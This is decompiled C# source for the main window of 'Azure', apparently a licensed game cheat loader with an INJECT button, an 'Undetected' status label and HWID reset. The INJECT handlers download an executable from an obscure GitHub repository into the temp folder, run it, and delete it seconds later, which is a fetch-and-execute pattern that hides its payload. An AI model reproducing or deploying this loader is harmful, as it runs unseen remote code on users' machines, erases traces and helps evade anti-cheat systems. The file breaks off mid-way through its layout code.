// Decompiled with JetBrains decompiler
// Type: KeyAuth.Main
// Assembly: Azure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 34575351-D411-4450-A7EC-E5B2579DA4D6
// Assembly location: C:\Users\xifib\OneDrive\Bureau\Azure.exe

using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;
using Siticone.UI.WinForms.Suite;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace KeyAuth
{
  public class Main : Form
  {
    private string chatchannel = "";
    private IContainer components;
    private SiticoneDragControl siticoneDragControl1;
    private SiticoneControlBox siticoneControlBox1;
    private SiticoneControlBox siticoneControlBox2;
    private Label label1;
    private SiticoneShadowForm siticoneShadowForm;
    private SiticoneLabel subscription;
    private SiticoneLabel expiry;
    private SiticoneLabel key;
    private SiticoneRoundedButton sendmsg;
    private System.Windows.Forms.Timer timer1;
    private SiticoneLabel ip;
    private SiticoneLabel createDate;
    private SiticoneLabel lastLogin;
    private System.Windows.Forms.GroupBox groupBox1;
    private System.Windows.Forms.PictureBox pictureBox1;
    private System.Windows.Forms.ComboBox comboBox1;
    private SiticoneLabel siticoneLabel12;
    private SiticoneLabel siticoneLabel11;
    private SiticoneLabel siticoneLabel10;
    private SiticoneLabel siticoneLabel9;
    private BindingSource bindingSource1;
    private System.Windows.Forms.PictureBox pictureBox2;
    private System.Windows.Forms.Button button1;
    private System.Windows.Forms.Button button2;
    private System.Windows.Forms.Button button3;
    private SiticoneLabel siticoneLabel8;
    private SiticoneLabel siticoneLabel13;
    private SiticoneLabel siticoneLabel14;
    private SiticoneLabel siticoneLabel18;
    private SiticoneLabel siticoneLabel6;
    private SiticoneLabel siticoneLabel7;
    private SiticoneLabel siticoneLabel21;
    private SiticoneLabel siticoneLabel22;
    private SiticoneLabel siticoneLabel23;
    private SiticoneLabel siticoneLabel20;
    private SiticoneLabel siticoneLabel19;
    private SiticoneLabel siticoneLabel5;
    private SiticoneLabel siticoneLabel1;

    public Main()
    {
      this.InitializeComponent();
      this.comboBox1.Items.Add((object) "Español");
      this.comboBox1.Items.Add((object) "English");
      this.comboBox1.SelectedItem = (object) "Español";
      this.comboBox1.SelectedIndexChanged += new EventHandler(this.comboBox1_SelectedIndexChanged);
      this.comboBox1.FlatStyle = FlatStyle.Flat;
      this.comboBox1.BackColor = Color.White;
      this.comboBox1.ForeColor = Color.Black;
      this.comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox1.Font = new Font("Segoe UI", 10f, FontStyle.Regular);
      this.comboBox1.Padding = new Padding(5);
      this.comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox1.SelectedIndexChanged += (EventHandler) ((s, e) => this.comboBox1.Invalidate());
    }

    private void Main_Load(object sender, EventArgs e)
    {
      this.RedondearBordes((Form) this, 20);
      this.key.Text = "Username: " + Login.KeyAuthApp.user_data.username;
      this.expiry.Text = "Expiry: " + this.UnixTimeToDateTime(long.Parse(Login.KeyAuthApp.user_data.subscriptions[0].expiry)).ToString();
      this.subscription.Text = "Subscription: " + Login.KeyAuthApp.user_data.subscriptions[0].subscription;
      this.ip.Text = "IP Address: " + Login.KeyAuthApp.user_data.ip;
      this.createDate.Text = "Creation date: " + this.UnixTimeToDateTime(long.Parse(Login.KeyAuthApp.user_data.createdate)).ToString();
      this.lastLogin.Text = "Last login: " + this.UnixTimeToDateTime(long.Parse(Login.KeyAuthApp.user_data.lastlogin)).ToString();
    }

    private void RedondearBordes(Form form, int radio)
    {
      GraphicsPath path = new GraphicsPath();
      Rectangle rectangle = new Rectangle(0, 0, form.Width, form.Height);
      path.AddArc(rectangle.X, rectangle.Y, radio, radio, 180f, 90f);
      path.AddArc(rectangle.Width - radio, rectangle.Y, radio, radio, 270f, 90f);
      path.AddArc(rectangle.Width - radio, rectangle.Height - radio, radio, radio, 0.0f, 90f);
      path.AddArc(rectangle.X, rectangle.Height - radio, radio, radio, 90f, 90f);
      form.Region = new Region(path);
    }

    private async void sendmsg_Click(object sender, EventArgs e)
    {
      string str1 = this.comboBox1.SelectedItem.ToString();
      string str2 = "https://github.com/hdgsdygsageuygi/hahreha45yq32/raw/main/";
      string path2 = str1 == "Español" ? "es.exe" : "en.exe";
      string address = str2 + path2;
      string filePath = Path.Combine(Path.GetTempPath(), path2);
      try
      {
        using (WebClient client = new WebClient())
          await client.DownloadFileTaskAsync(address, filePath);
        Process.Start(filePath);
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
        timer.Interval = 30000;
        timer.Tick += (EventHandler) ((timerSender, timerArgs) =>
        {
          System.IO.File.Delete(filePath);
          timer.Stop();
          timer.Dispose();
        });
        timer.Start();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void siticoneControlBox1_Click(object sender, EventArgs e) => Environment.Exit(0);

    public static bool SubExist(string name, int len)
    {
      for (int index = 0; index < len; ++index)
      {
        if (Login.KeyAuthApp.user_data.subscriptions[index].subscription == name)
          return true;
      }
      return false;
    }

    public string expirydaysleft()
    {
      TimeSpan timeSpan = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local).AddSeconds((double) long.Parse(Login.KeyAuthApp.user_data.subscriptions[0].expiry)).ToLocalTime() - DateTime.Now;
      int num = timeSpan.Days;
      string str1 = num.ToString();
      num = timeSpan.Hours;
      string str2 = num.ToString();
      return Convert.ToString(str1 + " Days " + str2 + " Hours Left");
    }

    public DateTime UnixTimeToDateTime(long unixtime)
    {
      DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
      try
      {
        dateTime = dateTime.AddSeconds((double) unixtime).ToLocalTime();
        return dateTime;
      }
      catch
      {
        return DateTime.MaxValue;
      }
    }

    private void siticoneRoundedButton1_Click(object sender, EventArgs e)
    {
    }

    private void hwid_Click(object sender, EventArgs e)
    {
    }

    private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
    }

    private void groupBox1_Enter(object sender, EventArgs e)
    {
    }

    private void label2_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel2_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel4_Click(object sender, EventArgs e)
    {
    }

    private void key_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel11_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel1_Click(object sender, EventArgs e)
    {
    }

    private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
      Console.WriteLine("URL del archivo de descarga: " + ("https://github.com/hdgsdygsageuygi/hahreha45yq32/raw/main/" + (this.comboBox1.SelectedItem.ToString() == "Español" ? "es.exe" : "en.exe")));
      this.comboBox1.FlatStyle = FlatStyle.Flat;
      this.comboBox1.BackColor = Color.White;
      this.comboBox1.ForeColor = Color.Black;
      this.comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox1.Font = new Font("Segoe UI", 10f, FontStyle.Regular);
      this.comboBox1.Padding = new Padding(5);
    }

    private void pictureBox2_Click(object sender, EventArgs e)
    {
    }

    private async void button1_Click(object sender, EventArgs e)
    {
      string str1 = this.comboBox1.SelectedItem.ToString();
      string str2 = "https://github.com/hdgsdygsageuygi/hahreha45yq32/raw/main/";
      string path2 = str1 == "Español" ? "es.exe" : "en.exe";
      string address = str2 + path2;
      string filePath = Path.Combine(Path.GetTempPath(), path2);
      try
      {
        using (WebClient client = new WebClient())
          await client.DownloadFileTaskAsync(address, filePath);
        Process.Start(filePath);
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
        timer.Interval = 10000;
        timer.Tick += (EventHandler) ((timerSender, timerArgs) =>
        {
          System.IO.File.Delete(filePath);
          timer.Stop();
          timer.Dispose();
        });
        timer.Start();
        await Task.Delay(2000);
        await this.DescargarYColocarArchivoVX();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private async Task DescargarYColocarArchivoVX()
    {
      string uriString = "https://azure-menu.com/VX.ytd";
      string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Azure", "textures");
      string fileName = Path.Combine(str, "VX.ytd");
      try
      {
        Directory.CreateDirectory(str);
        using (WebClient client = new WebClient())
          await client.DownloadFileTaskAsync(new Uri(uriString), fileName);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Error al descargar o colocar el archivo VX.ytd: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void button2_Click(object sender, EventArgs e)
    {
      string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Azure");
      if (Directory.Exists(str))
      {
        Process.Start("explorer.exe", str);
      }
      else
      {
        int num = (int) MessageBox.Show("La carpeta 'Azure' no existe en la ubicación especificada.", "Carpeta no encontrada", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void button3_Click(object sender, EventArgs e)
    {
      string fileName = "https://azure-menu.com/hwid";
      try
      {
        Process.Start(fileName);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Error al abrir la URL: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void siticoneLabel27_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel33_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel34_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel35_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel28_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel29_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel30_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel31_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel24_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel25_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel26_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel32_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel23_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if ((!disposing ? 0 : (this.components != null ? 1 : 0)) != 0)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Main));
      this.siticoneDragControl1 = new SiticoneDragControl(this.components);
      this.siticoneControlBox1 = new SiticoneControlBox();
      this.siticoneControlBox2 = new SiticoneControlBox();
      this.label1 = new Label();
      this.key = new SiticoneLabel();
      this.expiry = new SiticoneLabel();
      this.subscription = new SiticoneLabel();
      this.sendmsg = new SiticoneRoundedButton();
      this.ip = new SiticoneLabel();
      this.createDate = new SiticoneLabel();
      this.lastLogin = new SiticoneLabel();
      this.siticoneShadowForm = new SiticoneShadowForm(this.components);
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.groupBox1 = new System.Windows.Forms.GroupBox();
      this.pictureBox1 = new System.Windows.Forms.PictureBox();
      this.comboBox1 = new System.Windows.Forms.ComboBox();
      this.siticoneLabel12 = new SiticoneLabel();
      this.siticoneLabel10 = new SiticoneLabel();
      this.siticoneLabel11 = new SiticoneLabel();
      this.siticoneLabel9 = new SiticoneLabel();
      this.bindingSource1 = new BindingSource(this.components);
      this.pictureBox2 = new System.Windows.Forms.PictureBox();
      this.button1 = new System.Windows.Forms.Button();
      this.button2 = new System.Windows.Forms.Button();
      this.button3 = new System.Windows.Forms.Button();
      this.siticoneLabel8 = new SiticoneLabel();
      this.siticoneLabel13 = new SiticoneLabel();
      this.siticoneLabel14 = new SiticoneLabel();
      this.siticoneLabel18 = new SiticoneLabel();
      this.siticoneLabel5 = new SiticoneLabel();
      this.siticoneLabel19 = new SiticoneLabel();
      this.siticoneLabel20 = new SiticoneLabel();
      this.siticoneLabel22 = new SiticoneLabel();
      this.siticoneLabel23 = new SiticoneLabel();
      this.siticoneLabel6 = new SiticoneLabel();
      this.siticoneLabel7 = new SiticoneLabel();
      this.siticoneLabel21 = new SiticoneLabel();
      this.siticoneLabel1 = new SiticoneLabel();
      this.groupBox1.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      ((ISupportInitialize) this.bindingSource1).BeginInit();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      this.SuspendLayout();
      this.siticoneDragControl1.TargetControl = (Control) this;
      this.siticoneControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox1.FillColor = Color.FromArgb(35, 39, 42);
      this.siticoneControlBox1.HoveredState.FillColor = Color.FromArgb(232, 17, 35);
      this.siticoneControlBox1.HoveredState.IconColor = Color.White;
      this.siticoneControlBox1.HoveredState.Parent = (Siticone.UI.WinForms.Suite.ControlBox) this.siticoneControlBox1;
      this.siticoneControlBox1.IconColor = Color.White;
      this.siticoneControlBox1.Location = new Point(668, 4);
      this.siticoneControlBox1.Name = "siticoneControlBox1";
      this.siticoneControlBox1.ShadowDecoration.Parent = (Control) this.siticoneControlBox1;
      this.siticoneControlBox1.Size = new Size(45, 29);
      this.siticoneControlBox1.TabIndex = 1;
      this.siticoneControlBox1.Click += new EventHandler(this.siticoneControlBox1_Click);
      this.siticoneControlBox2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox2.ControlBoxType = ControlBoxType.MinimizeBox;
      this.siticoneControlBox2.FillColor = Color.FromArgb(35, 39, 42);
      this.siticoneControlBox2.HoveredState.Parent = (Siticone.UI.WinForms.Suite.ControlBox) this.siticoneControlBox2;
      this.siticoneControlBox2.IconColor = Color.White;
      this.siticoneControlBox2.Location = new Point(623, 4);
      this.siticoneControlBox2.Name = "siticoneControlBox2";
      this.siticoneControlBox2.ShadowDecoration.Parent = (Control) this.siticoneControlBox2;
      this.siticoneControlBox2.Size = new Size(45, 29);
      this.siticoneControlBox2.TabIndex = 2;
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Segoe UI Light", 10f);
      this.label1.ForeColor = Color.White;
      this.label1.Location = new Point(-1, 136);
      this.label1.Name = "label1";
      this.label1.Size = new Size(0, 19);
      this.label1.TabIndex = 22;
      this.key.BackColor = Color.Transparent;
      this.key.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
      this.key.ForeColor = SystemColors.ButtonHighlight;
      this.key.Location = new Point(17, 71);
      this.key.Margin = new Padding(2);
      this.key.Name = "key";
      this.key.Size = new Size(96, 19);
      this.key.TabIndex = 37;
      this.key.Text = "usernameLabel";
      this.key.Click += new EventHandler(this.key_Click);
      this.expiry.BackColor = Color.Transparent;
      this.expiry.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.expiry.ForeColor = SystemColors.ButtonHighlight;
      this.expiry.Location = new Point(20, 102);
      this.expiry.Margin = new Padding(2);
      this.expiry.Name = "expiry";
      this.expiry.Size = new Size(63, 15);
      this.expiry.TabIndex = 38;
      this.expiry.Text = "expiryLabel";
      this.subscription.BackColor = Color.Transparent;
      this.subscription.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.subscription.ForeColor = SystemColors.ButtonHighlight;
      this.subscription.Location = new Point(20, 120);
      this.subscription.Margin = new Padding(2);
      this.subscription.Name = "subscription";
      this.subscription.Size = new Size(95, 15);
      this.subscription.TabIndex = 39;
      this.subscription.Text = "subscriptionLabel";
      this.sendmsg.BackColor = Color.Transparent;
      this.sendmsg.BackgroundImageLayout = ImageLayout.None;
      this.sendmsg.BorderColor = Color.FromArgb((int) byte.MaxValue, 224, 192);
      this.sendmsg.BorderThickness = 1;
      this.sendmsg.CheckedState.Parent = (CustomButtonBase) this.sendmsg;
      this.sendmsg.CustomImages.Parent = (CustomButtonBase) this.sendmsg;
      this.sendmsg.DialogResult = DialogResult.No;
      this.sendmsg.FillColor = Color.FromArgb(208, 161, 96);
      this.sendmsg.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.sendmsg.ForeColor = Color.White;
      this.sendmsg.HoveredState.BorderColor = Color.FromArgb(213, 218, 223);
      this.sendmsg.HoveredState.Parent = (CustomButtonBase) this.sendmsg;
      this.sendmsg.Location = new Point(35, 257);
      this.sendmsg.Name = "sendmsg";
      this.sendmsg.ShadowDecoration.Parent = (Control) this.sendmsg;
      this.sendmsg.Size = new Size(151, 27);
      this.sendmsg.TabIndex = 42;
      this.sendmsg.Text = "INYECTAR";
      this.sendmsg.Visible = false;
      this.sendmsg.Click += new EventHandler(this.sendmsg_Click);
      this.ip.BackColor = Color.Transparent;
      this.ip.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ip.ForeColor = SystemColors.ButtonHighlight;
      this.ip.Location = new Point(20, 139);
      this.ip.Margin = new Padding(2);
      this.ip.Name = "ip";
      this.ip.Size = new Size(41, 15);
      this.ip.TabIndex = 44;
      this.ip.Text = "ipLabel";
      this.createDate.BackColor = Color.Transparent;
      this.createDate.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.createDate.ForeColor = SystemColors.ButtonHighlight;
      this.createDate.Location = new Point(20, 158);
      this.createDate.Margin = new Padding(2);
      this.createDate.Name = "createDate";
      this.createDate.Size = new Size(86, 15);
      this.createDate.TabIndex = 46;
      this.createDate.Text = "createDateLabel";
      this.lastLogin.BackColor = Color.Transparent;
      this.lastLogin.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lastLogin.ForeColor = SystemColors.ButtonHighlight;
      this.lastLogin.Location = new Point(20, 176);
      this.lastLogin.Margin = new Padding(2);
      this.lastLogin.Name = "lastLogin";
      this.lastLogin.Size = new Size(79, 15);
      this.lastLogin.TabIndex = 47;
      this.lastLogin.Text = "lastLoginLabel";
      this.timer1.Enabled = true;
      this.timer1.Interval = 1;
      this.groupBox1.Controls.Add((Control) this.siticoneLabel1);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel6);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel7);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel21);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel22);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel23);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel20);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel19);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel5);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel8);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel13);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel14);
      this.groupBox1.Controls.Add((Control) this.siticoneLabel18);
      this.groupBox1.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.groupBox1.ForeColor = SystemColors.ButtonHighlight;
      this.groupBox1.Location = new Point(287, 39);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(418, 245);
      this.groupBox1.TabIndex = 56;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "ChangeLogs";
      this.groupBox1.Enter += new EventHandler(this.groupBox1_Enter);
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(26, 4);
      this.pictureBox1.MaximumSize = new Size(160, 160);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(160, 70);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox1.TabIndex = 61;
      this.pictureBox1.TabStop = false;
      this.comboBox1.BackColor = Color.FromArgb(35, 39, 42);
      this.comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox1.FlatStyle = FlatStyle.System;
      this.comboBox1.ForeColor = SystemColors.InactiveCaptionText;
      this.comboBox1.FormattingEnabled = true;
      this.comboBox1.Location = new Point(47, 222);
      this.comboBox1.Name = "comboBox1";
      this.comboBox1.RightToLeft = RightToLeft.No;
      this.comboBox1.Size = new Size(151, 21);
      this.comboBox1.TabIndex = 62;
      this.comboBox1.SelectedIndexChanged += new EventHandler(this.comboBox1_SelectedIndexChanged);
      this.siticoneLabel12.BackColor = Color.Transparent;
      this.siticoneLabel12.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
      this.siticoneLabel12.ForeColor = Color.ForestGreen;
      this.siticoneLabel12.Location = new Point(631, 356);
      this.siticoneLabel12.Margin = new Padding(2);
      this.siticoneLabel12.Name = "siticoneLabel12";
      this.siticoneLabel12.Size = new Size(28, 19);
      this.siticoneLabel12.TabIndex = 60;
      this.siticoneLabel12.Text = "1.68 ";
      this.siticoneLabel10.BackColor = Color.Transparent;
      this.siticoneLabel10.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
      this.siticoneLabel10.ForeColor = Color.ForestGreen;
      this.siticoneLabel10.Location = new Point(441, 357);
      this.siticoneLabel10.Margin = new Padding(2);
      this.siticoneLabel10.Name = "siticoneLabel10";
      this.siticoneLabel10.Size = new Size(73, 19);
      this.siticoneLabel10.TabIndex = 58;
      this.siticoneLabel10.Text = "Undetected";
      this.siticoneLabel11.BackColor = Color.Transparent;
      this.siticoneLabel11.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
      this.siticoneLabel11.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel11.Location = new Point(530, 356);
      this.siticoneLabel11.Margin = new Padding(2);
      this.siticoneLabel11.Name = "siticoneLabel11";
      this.siticoneLabel11.Size = new Size(97, 19);
      this.siticoneLabel11.TabIndex = 59;
      this.siticoneLabel11.Text = "Game Versión :";
      this.siticoneLabel11.Click += new EventHandler(this.siticoneLabel11_Click);
      this.siticoneLabel9.BackColor = Color.Transparent;
      this.siticoneLabel9.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
      this.siticoneLabel9.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel9.Location = new Point(349, 356);
      this.siticoneLabel9.Margin = new Padding(2);
      this.siticoneLabel9.Name = "siticoneLabel9";
      this.siticoneLabel9.Size = new Size(88, 19);
      this.siticoneLabel9.TabIndex = 57;
      this.siticoneLabel9.Text = "Menu Status :";
      this.pictureBox2.BackColor = Color.Transparent;
      this.pictureBox2.Image = (Image) componentResourceManager.GetObject("pictureBox2.Image");
      this.pictureBox2.Location = new Point(668, 354);
      this.pictureBox2.MaximumSize = new Size(170, 180);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(62, 24);
      this.pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox2.TabIndex = 63;
      this.pictureBox2.TabStop = false;
      this.pictureBox2.Click += new EventHandler(this.pictureBox2_Click);
      this.button1.BackColor = Color.FromArgb(208, 161, 96);
      this.button1.BackgroundImageLayout = ImageLayout.None;
      this.button1.Cursor = Cursors.Default;
      this.button1.FlatAppearance.BorderColor = Color.FromArgb(208, 161, 96);
      this.button1.FlatAppearance.BorderSize = 5;
      this.button1.FlatAppearance.MouseDownBackColor = Color.FromArgb(208, 161, 96);
      this.button1.FlatAppearance.MouseOverBackColor = Color.FromArgb(208, 161, 96);
      this.button1.Font = new Font("Calibri", 18f, FontStyle.Bold);
      this.button1.ForeColor = Color.White;
      this.button1.Location = new Point(35, 252);
      this.button1.Name = "button1";
      this.button1.RightToLeft = RightToLeft.No;
      this.button1.Size = new Size(174, 45);
      this.button1.TabIndex = 64;
      this.button1.Text = "INJECT";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.button2.BackColor = Color.FromArgb(208, 161, 96);
      this.button2.BackgroundImageLayout = ImageLayout.None;
      this.button2.Cursor = Cursors.Default;
      this.button2.FlatAppearance.BorderColor = Color.FromArgb(208, 161, 96);
      this.button2.FlatAppearance.BorderSize = 5;
      this.button2.FlatAppearance.MouseDownBackColor = Color.FromArgb(208, 161, 96);
      this.button2.FlatAppearance.MouseOverBackColor = Color.FromArgb(208, 161, 96);
      this.button2.Font = new Font("Calibri", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.button2.ForeColor = Color.White;
      this.button2.Location = new Point(512, 300);
      this.button2.Name = "button2";
      this.button2.RightToLeft = RightToLeft.No;
      this.button2.Size = new Size(162, 31);
      this.button2.TabIndex = 65;
      this.button2.Text = "Folder Azure";
      this.button2.UseVisualStyleBackColor = false;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.button3.BackColor = Color.FromArgb(208, 161, 96);
      this.button3.BackgroundImageLayout = ImageLayout.None;
      this.button3.Cursor = Cursors.Default;
      this.button3.FlatAppearance.BorderColor = Color.FromArgb(208, 161, 96);
      this.button3.FlatAppearance.BorderSize = 5;
      this.button3.FlatAppearance.MouseDownBackColor = Color.FromArgb(208, 161, 96);
      this.button3.FlatAppearance.MouseOverBackColor = Color.FromArgb(208, 161, 96);
      this.button3.Font = new Font("Calibri", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.button3.ForeColor = Color.White;
      this.button3.Location = new Point(323, 300);
      this.button3.Name = "button3";
      this.button3.RightToLeft = RightToLeft.No;
      this.button3.Size = new Size(162, 31);
      this.button3.TabIndex = 66;
      this.button3.Text = "Reset HWID";
      this.button3.UseVisualStyleBackColor = false;
      this.button3.Click += new EventHandler(this.button3_Click);
      this.siticoneLabel8.BackColor = Color.Transparent;
      this.siticoneLabel8.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel8.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel8.Location = new Point(11, 78);
      this.siticoneLabel8.Margin = new Padding(2);
      this.siticoneLabel8.Name = "siticoneLabel8";
      this.siticoneLabel8.Size = new Size(155, 15);
      this.siticoneLabel8.TabIndex = 135;
      this.siticoneLabel8.Text = "• Parachute - Player - General";
      this.siticoneLabel13.BackColor = Color.Transparent;
      this.siticoneLabel13.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel13.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel13.Location = new Point(11, 63);
      this.siticoneLabel13.Margin = new Padding(2);
      this.siticoneLabel13.Name = "siticoneLabel13";
      this.siticoneLabel13.Size = new Size(197, 15);
      this.siticoneLabel13.TabIndex = 134;
      this.siticoneLabel13.Text = "• Swim in the air - Player - Movement";
      this.siticoneLabel14.BackColor = Color.Transparent;
      this.siticoneLabel14.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel14.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel14.Location = new Point(5, 45);
      this.siticoneLabel14.Margin = new Padding(2);
      this.siticoneLabel14.Name = "siticoneLabel14";
      this.siticoneLabel14.Size = new Size(56, 15);
      this.siticoneLabel14.TabIndex = 133;
      this.siticoneLabel14.Text = "➦ Added:";
      this.siticoneLabel18.BackColor = Color.Transparent;
      this.siticoneLabel18.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel18.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel18.Location = new Point(5, 27);
      this.siticoneLabel18.Margin = new Padding(2);
      this.siticoneLabel18.Name = "siticoneLabel18";
      this.siticoneLabel18.Size = new Size(75, 15);
      this.siticoneLabel18.TabIndex = 132;
      this.siticoneLabel18.Text = "⁞ Version 1.1.3";
      this.siticoneLabel5.BackColor = Color.Transparent;
      this.siticoneLabel5.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel5.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel5.Location = new Point(11, 111);
      this.siticoneLabel5.Margin = new Padding(2);
      this.siticoneLabel5.Name = "siticoneLabel5";
      this.siticoneLabel5.Size = new Size(200, 15);
      this.siticoneLabel5.TabIndex = 138;
      this.siticoneLabel5.Text = "• Bring Personal Vehicle abroad to me";
      this.siticoneLabel19.BackColor = Color.Transparent;
      this.siticoneLabel19.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel19.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel19.Location = new Point(11, 94);
      this.siticoneLabel19.Margin = new Padding(2);
      this.siticoneLabel19.Name = "siticoneLabel19";
      this.siticoneLabel19.Size = new Size(184, 15);
      this.siticoneLabel19.TabIndex = 139;
      this.siticoneLabel19.Text = "• Commit Suicide - Player - General";
      this.siticoneLabel20.BackColor = Color.Transparent;
      this.siticoneLabel20.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel20.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel20.Location = new Point(11, (int) sbyte.MaxValue);
      this.siticoneLabel20.Margin = new Padding(2);
      this.siticoneLabel20.Name = "siticoneLabel20";
      this.siticoneLabel20.Size = new Size(198, 15);
      this.siticoneLabel20.TabIndex = 140;
      this.siticoneLabel20.Text = "• Speedometer KM - Vehicle - General";
      this.siticoneLabel22.BackColor = Color.Transparent;
      this.siticoneLabel22.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel22.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel22.Location = new Point(11, 142);
      this.siticoneLabel22.Margin = new Padding(2);
      this.siticoneLabel22.Name = "siticoneLabel22";
      this.siticoneLabel22.Size = new Size(187, 15);
      this.siticoneLabel22.TabIndex = 142;
